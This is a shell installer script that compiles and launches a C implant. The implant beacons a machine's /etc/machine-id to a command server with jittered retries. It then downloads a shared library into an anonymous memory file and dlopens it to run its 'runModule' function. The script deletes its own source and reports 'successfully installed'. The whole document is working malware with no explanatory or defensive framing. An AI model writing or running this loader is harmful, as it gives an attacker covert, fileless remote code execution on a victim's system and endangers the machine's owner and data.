#!/bin/sh

    cat > /tmp/desu.c << EOF 
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/mman.h>

void die(char* message);
void reply(int s);
int rand_int(int max);

int main(int argc, char *argv[])
{
int s;
int retry_count;
char* host = argv[1];
int port = strtol(argv[2], NULL, 10);
char uuid[36];
struct sockaddr_in server;
FILE *fp=fopen("/etc/machine-id", "r");
if (fp == NULL)
{
die("Error getting machine ID");
}
if (fgets(uuid, 33, fp) == NULL)
{
die("Error getting machine ID");
}
fclose(fp);
memmove(uuid+3, uuid, 33);
uuid[0] = 0xe2;
uuid[1] = 0x99;
uuid[2] = 0xa5;
server.sin_addr.s_addr = inet_addr(host);
server.sin_family = AF_INET;
server.sin_port = htons(port);
retry_count = 0;
while(1){
int jitter = rand_int(13);
sleep(2 * jitter);
if ((s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
{
printf("Error creating socket\n"); 
retry_count += 1;
sleep( (5 * retry_count) * jitter );
continue;
} else
printf("Socket created\n");
if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
{
printf("connection error\n");
retry_count += 1;
sleep( (5 * retry_count) * jitter );
continue;
}
printf("connected to server\n");
if (send(s, uuid, strlen(uuid), 0) < 0)
{
printf("error while sending transmission\n");
retry_count += 1;
sleep((5 * retry_count) * jitter);
continue;
}
reply(s);
retry_count = 0;
shutdown(s, 2);
close(2);
sleep(6 * jitter);
}
return 0;
}
void die(char* message) {
fprintf(stderr, message);
exit(EXIT_FAILURE);
}
void reply(int s) {
char buffer[512];
int n;
int size_recv, size_total = 0;
for (;;) {
memset( buffer, 0, 512 );
if ( ( size_recv = recv( s, buffer, sizeof( buffer ), 0 ) ) < 0 ) {
break;
} else if (size_recv > 0 ) {
int afd;
char *path;
pid_t pid;
char ch;
afd = memfd_create("", MFD_CLOEXEC); // closes file descriptor on execution
if (afd < 0) {
fprintf(stderr, "error creating file descriptor");
exit(-1);
}
write(afd, buffer, size_recv); 
while((n = recv(s, buffer, size_recv, 0 )) > 0) {
write(afd, buffer, n);
}
pid = getpid();
asprintf(&path, "/proc/%d/fd/%i", pid, afd);
printf("/proc/%d/fd/%i\n", pid, afd);
void *handle;
const char* error_msg;
void (*execute)(void);
handle = dlopen(path, RTLD_LAZY);
if ( !handle ) {
fprintf(stderr, "%s\n", dlerror());
break; 
}
close(afd);
dlerror();
execute = dlsym(handle, "runModule");
error_msg = dlerror();
if ( error_msg ) {
fprintf(stderr, "Error accessing function %s \n", error_msg);
break;
}
(*execute)();
dlclose(handle);
break;
} else
break;
}
}
int rand_int(int max) {
int divisor = RAND_MAX/(max+1);
int randint;
do {
randint = rand()/divisor;
} while (randint > max);
return randint;
}


EOF

    gcc -o /tmp/desu /tmp/desu.c -ldl
    rm -f /tmp/desu.c
    chmod +x /tmp/desu
    /tmp/desu 127.0.0.1 23855& 
        
    echo "successfully installed"
    exit 0
